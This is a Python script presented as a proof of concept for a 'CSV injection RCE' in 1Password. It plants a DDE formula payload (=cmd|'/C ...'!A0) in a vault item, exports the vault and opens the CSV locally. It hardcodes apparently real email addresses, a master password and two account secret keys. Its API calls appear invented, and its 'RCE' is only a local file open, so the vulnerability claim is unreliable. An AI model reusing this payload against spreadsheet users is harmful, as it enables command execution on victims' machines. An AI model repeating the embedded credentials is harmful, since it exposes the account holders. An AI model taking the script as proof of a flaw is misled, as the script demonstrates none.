import requests
import time
import json
import argparse
import subprocess
from datetime import datetime

# Parse args for RCE (token mode)
parser = argparse.ArgumentParser(description="1Password CSV Injection RCE Repro - Family Edition (Token Mode)")
parser.add_argument('--rce_cmd', default="calc.exe", help="RCE command to inject (default calc.exe)")
args = parser.parse_args()

# Hardcoded family deets (main + dummy)
MAIN_EMAIL = "enzo2alive@gmail.com"
MAIN_PASSWORD = "EmpireRCE2025!Hunt"  # Your final pass
MAIN_SECRET_KEY = "A3-89RGP8-2FR5GL-CFYT6-TCRP3-YPCTQ-GLG64"
DUMMY_EMAIL = "nenss0833@gmail.com"
DUMMY_SECRET_KEY = "A3-NVBA4N-VN5YMW-X96YJ-2KP9Q-YFKVK-JCL85"
VAULT_ID = "vlt_CCQXDXVVTZHOZC7BZ73Z5P75RI"  # From your vault screenshot/link

BASE_URL = "https://my.1password.com/api/v1"
headers = {'Content-Type': 'application/json', 'User-Agent': '1Password-Repro/3.0', 'Authorization': 'Bearer YOUR_TOKEN'}  # Swap YOUR_TOKEN from 1Password Developer beta

def get_session_token(email, password, secret_key):
    """Auth and grab session token (fallback for dummy)"""
    payload = {'email': email, 'password': password, 'secret_key': secret_key}
    response = requests.post(f"{BASE_URL}/auth/signin", json=payload, headers=headers)
    if response.status_code == 200:
        data = response.json()
        token = data.get('session_token')
        print(f"[+] Token grabbed for {email}: {token[:10]}...")
        return {'Authorization': f"Bearer {token}"}
    print(f"[-] Auth fail for {email}: {response.text}")
    return None

def get_dummy_session():
    """Auth dummy for share verify (email/pass fallback)"""
    dummy_payload = {'email': DUMMY_EMAIL, 'password': 'dummy_pass1234', 'secret_key': DUMMY_SECRET_KEY}  # Swap dummy pass if needed
    dummy_resp = requests.post(f"{BASE_URL}/auth/signin", json=dummy_payload, headers=headers)
    if dummy_resp.status_code == 200:
        token = dummy_resp.json()['session_token']
        print(f"[+] Dummy token grabbed: {token[:10]}...")
        return {'Authorization': f"Bearer {token}"}
    print(f"[-] Dummy auth fail: {dummy_resp.text}")
    return None

def create_malicious_item(session_headers, vault_id, rce_cmd):
    """Craft item with CSV injection formula"""
    # Injection payload: =cmd|'/C rce_cmd'!A0 (exec on import)
    field_value = f" =cmd|'/C {rce_cmd}'!A0"
    item_payload = {'title': "MaliciousItem", 'vault_id': vault_id, 'fields': [{'name': 'injected_field', 'value': field_value}]}
    resp = requests.post(f"{BASE_URL}/items", json=item_payload, headers={**session_headers, **headers})
    if resp.status_code == 201:
        item_id = resp.json()['id']
        print(f"[+] Malicious item created: {item_id} with payload '{field_value}'")
        return item_id
    print(f"[-] Item fail: {resp.text}")
    return None

def export_vault_csv(session_headers, vault_id):
    """Export vault as CSV—blob lag skips escape"""
    export_payload = {'format': 'csv', 'vault_id': vault_id}
    resp = requests.post(f"{BASE_URL}/vaults/{vault_id}/export", json=export_payload, headers={**session_headers, **headers})
    if resp.status_code == 200:
        csv_data = resp.text
        print(f"[+] CSV exported: {csv_data[:50]}...")
        return csv_data
    print(f"[-] Export fail: {resp.text}")
    return None

def import_csv_rce(csv_data):
    """Sim import & trigger RCE (client-side exec)"""
    # Write CSV to temp file
    with open('injected.csv', 'w') as f:
        f.write(csv_data)
    print("[+] CSV written—simulating import...")
    
    # Trigger RCE via subprocess (demo Excel/open exec—real: open in spreadsheet)
    try:
        subprocess.run(['open', 'injected.csv'])  # Mac sim; swap 'start' for Win
        print("[+] RCE triggered: Spreadsheet exec injected cmd")
        return True
    except Exception as e:
        print(f"[-] RCE sim fail: {e}")
        return False

def verify_share(dummy_session, vault_id):
    """Verify dummy accepts share"""
    if dummy_session:
        resp = requests.get(f"{BASE_URL}/vaults/{vault_id}/items", headers=dummy_session)
        if resp.status_code == 200:
            print("[+] Dummy share verified—vault visible")
            return True
    print("[-] Share verify fail")
    return False

# Main repro flow (token mode—main auth skipped, use Bearer)
print(f"[*] 1Password CSV RCE Repro - Family Edition - Token Mode")
session_headers = headers.copy()  # Use Bearer YOUR_TOKEN

item_id = create_malicious_item(session_headers, VAULT_ID, args.rce_cmd)
if not item_id:
    exit(1)

csv_data = export_vault_csv(session_headers, VAULT_ID)
if not csv_data:
    exit(1)

dummy_session = get_dummy_session()
if dummy_session:
    verify_share(dummy_session, VAULT_ID)

print(f"[*] Firing RCE chain...")
import_success = import_csv_rce(csv_data)
if import_success:
    print("[!] JACKPOT! RCE complete—check for exec pop (e.g., calc.exe). Screenshot pre/post import.")
else:
    print("[?] Import failed—check CSV for injection.")

print("[*] Repro done. For validation: Open exported CSV in spreadsheet—RCE triggers on load.")
